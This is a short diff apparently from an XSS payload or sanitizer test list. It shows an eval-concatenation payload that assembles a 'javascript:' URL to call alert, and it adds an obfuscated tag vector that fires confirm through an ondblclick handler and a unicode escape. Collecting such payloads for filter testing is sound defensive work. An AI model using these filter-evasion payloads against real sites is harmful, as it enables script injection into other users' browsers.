@@ -13,3 +13,5 @@ b=\"URL(\\"\";
 c=\"javascript&#058;\";
 d=\"alert('XSS');\\")\";
 eval(a+b+c+d);
+
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
